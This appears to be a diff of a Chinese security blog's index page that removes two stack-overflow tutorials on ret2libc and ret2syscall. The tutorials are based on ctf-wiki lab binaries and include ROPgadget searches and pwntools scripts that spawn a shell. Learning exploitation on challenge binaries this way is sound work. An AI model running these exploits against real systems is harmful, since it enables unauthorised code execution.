-<p>4.找到可控局部变量到返回地址的偏移</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc05.png" alt=""></p>
-<p>0xfe290-0xfe210+0x8=0x88</p>
-<p>记录一下得到的信息：</p>
-<ul>
-<li>libc.so.6的基准地址是0x7fbf4cfcf000</li>
-<li>libc_system函数的偏移是0x435d0，那么它的实际地址就是0x7FBF4D0125D0</li>
-<li>/bin/sh字符串的偏移是0x17f573，那么它的实际地址就是0x7FBF4D14E573</li>
-<li>可控变量到返回地址的偏移是0x88</li>
-</ul>
-<p>接下来就可以构造payload了</p>
-<h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>首先分析payload构成，我们需要使返回地址指向system函数，然后system函数被调用时，rbp后面会紧跟着system的返回地址，然后再跟着system函数的入参，所以payload就是局部变量到返回地址的偏移padding1，然后libc_system的地址覆盖返回地址，后面接着一个8字节随意填充的padding2，再接上入参/bin/sh</p>
-<p>payload = padding1+system+padding2+”/bin/sh”</p>
-<p>payload =”A”*0x88+p64(system_addr)+p64(123)+p64(binsh_addr)</p>
-<p>然后写出exp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./ret2libc64&apos;)</span><br><span class="line"></span><br><span class="line">system_addr = 0x7FBF4D0125D0</span><br><span class="line">binsh_addr = 0x7FBF4D14E573</span><br><span class="line">payload = &quot;A&quot;*0x88+p64(system_addr)+p64(123)+p64(binsh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
-<p>执行exp即可获取shell</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/25/栈溢出之ret2syscall/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2020/02/25/栈溢出之ret2syscall/" itemprop="url">
-                  栈溢出之ret2syscall
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-25T21:12:05+08:00">
-                2020-02-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/二进制/" itemprop="url" rel="index">
-                    <span itemprop="name">二进制</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2020/02/25/栈溢出之ret2syscall/" class="leancloud_visitors" data-flag-title="栈溢出之ret2syscall">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在NX保护机制被打开无法使用ret2shellcode，且代码中没有可利用片段时无法使用ret2text时，仍然有很多方法可以构造恶意代码，这篇文章就介绍另一种方法：ret2syscall</p>
-<h2 id="ret2syscall原理"><a href="#ret2syscall原理" class="headerlink" title="ret2syscall原理"></a>ret2syscall原理</h2><p>ret2syscall，系统呼叫，也叫系统调用，顾名思义，ret2syscall是一种通过系统调用来执行恶意代码的攻击方式。</p>
-<p>在计算机中，系统调用指运行在使用者空间的程序向操作系统内核请求需要更高权限运行的服务。Linux的系统调用通过int 80h实现，用系统调用号来区分入口函数。当进程执行系统调用时，先调用系统调用库中定义某个函数，该函数通常被展开成前面提到的_syscallN的形式通过int 0x80来陷入核心，其参数也将被通过寄存器传往核心。</p>
-<p>系统调用相关的知识就不再赘述，感兴趣的可以去查阅相关资料，下来通过实验来详细说明一下这种攻击方式。</p>
-<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>本题目我们使用ctf-wiki中basicROP-ret2syscall的例子。直接在<a href="https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#ret2syscall中提供的链接下载即可（ctf-wiki中旧链接题目已经被迁移到同作者另一个项目ctf-challenges中）。" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#ret2syscall中提供的链接下载即可（ctf-wiki中旧链接题目已经被迁移到同作者另一个项目ctf-challenges中）。</a></p>
-<p>题目链接：<br><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall</a></p>
-<p>题目源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">char *shell = &quot;/bin/sh&quot;;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">    setvbuf(stdin, 0LL, 1, 0LL);</span><br><span class="line">    </span><br><span class="line">    char buf[100];</span><br><span class="line"></span><br><span class="line">    printf(&quot;This time, no system() and NO SHELLCODE!!!\n&quot;);</span><br><span class="line">    printf(&quot;What do you plan to do?\n&quot;);</span><br><span class="line">    gets(buf);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="ROP过程"><a href="#ROP过程" class="headerlink" title="ROP过程"></a>ROP过程</h2><h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h3><p>面对不是我们自己编译的程序，首先file命令查看程序，然后将程序放入gdb中，使用checksec查看一下安全机制。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall01.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall02.png" alt=""></p>
-<p>分析程序，在15行gets(buf)中很明显有栈溢出，但是本例中，既没有可以执行的恶意代码system(“/bin/sh”)，也有NX保护，无法直接构造执行shellcode。但是具有一个”/bin/sh”字符串，这个字符串看上去一定有问题，却无法直接利用，我们根据前面讲到的系统调用的定义，查阅相关资料，就会有一些思路。</p>
-<p>我们如果想使用系统调用int 0x80来打开一个shell，就需要构造一个如下指令的系统调用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure></p>
-<p>由于我们刚才file看到这个程序是32位程序，就需要当eax是int 0xb时，就可以调用系统指令execve。</p>
-<p>这个指令有三个参数，分别是”/bin/sh”,NULL,NULL。</p>
-<p>那我们在执行时就还需要三个额外的寄存器来存储这三个值，分别是ebx、ecx、edx。</p>
-<p>需要的操作有以下四点：</p>
-<ul>
-<li>1.使eax等于int 0xb，触发execve()。</li>
-<li>2.ebx是第一个参数，要赋值为”/bin/sh”</li>
-<li>3.ecx是第二个参数，要赋值为0</li>
-<li>4.ecx是第三个参数，要赋值为0</li>
-</ul>
-<p>所以我们要寻找int 0x80，”/bin/sh”的地址，以及对eax、ebx、ecx、edx四个寄存器赋值的指令地址。</p>
-<h3 id="寻找信息"><a href="#寻找信息" class="headerlink" title="寻找信息"></a>寻找信息</h3><p>接下来就按照整理好的思路一步步获取信息，此次需要使用到一个工具ROPgadget。</p>
-<p>1.寻找int 0x80地址</p>
-<p>ROPgadget –binary ret2syscall –only “int”</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall03.png" alt=""></p>
-<p>2.寻找”/bin/sh”地址</p>
-<p>ROPgadget –binary ret2syscall –string “/bin/sh”</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall04.png" alt=""></p>
-<p>3.寻找对eax赋值的地址</p>
-<p>ROPgadget –binary ret2syscall –only “pop|ret” |grep eax</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall05.png" alt=""></p>
-<p>4.寻找对ebx赋值的地址</p>
-<p>ROPgadget –binary ret2syscall –only “pop|ret” |grep ebx</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall06.png" alt=""></p>
-<p>5.寻找对ecx赋值的地址</p>
-<p>ROPgadget –binary ret2syscall –only “pop|ret” |grep ecx</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall07.png" alt=""></p>
-<p>6.寻找对edx赋值的地址</p>
-<p>ROPgadget –binary ret2syscall –only “pop|ret” |grep edx</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall08.png" alt=""></p>
-<p>从ROPgadget的结果可以得到，int 0x80的地址是0x8049421，”/bin/sh”的地址是0x80be408，对eax赋值的地址是0x80bb196，连续对ebx、ecx、edx赋值的地址是0x806eb90。</p>
-<p>此时我们所有需要的信息都得到了，就可以开始构造我们的payload了。</p>
-<h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>首先分析payload构成，要在将返回地址指向int 0x80,在返回之前要将四个寄存器赋值完成，所以最终payload构成是</p>
-<p>payload = padding+pop_eax+”0xb”+pop_edx_ecx_ebx+0+0+”/bin/sh”+int 0x80</p>
-<p>padding是填充的偏移</p>
-<p>payload = “A”*112+p32(eax)+p32(0xb)+p32(edx_ecx_ebx)+p32(0)+p32(0)+p32(binsh)+p32(int_0x80)</p>
-<p>然后写出exp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./ret2syscall&apos;)</span><br><span class="line"></span><br><span class="line">eax = 0x080bb196</span><br><span class="line">edx_ecx_ebx = 0x0806eb90</span><br><span class="line">int_0x80 = 0x08049421</span><br><span class="line">binsh = 0x80be408</span><br><span class="line">payload = &quot;A&quot;*112+p32(eax)+p32(0xb)+p32(edx_ecx_ebx)+p32(0)+p32(0)+p32(binsh)+p32(int_0x80)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
-<p>执行exp即可获取shell</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall09.png" alt=""></p>
-<p>当然也可以通过别的方法分别赋值几个寄存器，只要最后让每一个寄存器的值都符合条件，就可以触发。如：</p>
-<p>上面我们打印了grep ecx和edx时得到的</p>
-<p>ecx_ebx = 0x0806eb91</p>
-<p>edx = 0x0806eb6a</p>
-<p>那么payload也可以写成</p>
-<p>payload = “A”*112+p32(eax)+p32(0xb)+p32(ecx_ebx)+p32(0)+p32(binsh)+p32(edx)+p32(0)+p32(int_0x80)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./ret2syscall&apos;)</span><br><span class="line"></span><br><span class="line">eax = 0x080bb196</span><br><span class="line">ecx_ebx = 0x0806eb91</span><br><span class="line">edx = 0x0806eb6a</span><br><span class="line">int_0x80 = 0x08049421</span><br><span class="line">binsh = 0x80be408</span><br><span class="line">payload = &quot;A&quot;*112+p32(eax)+p32(0xb)+p32(ecx_ebx)+p32(0)+p32(binsh)+p32(edx)+p32(0)+p32(int_0x80)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<p>执行exp2获取shell</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall10.png" alt=""></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -2305,7 +2298,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">108</span>
+                <span class="site-state-item-count">111</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
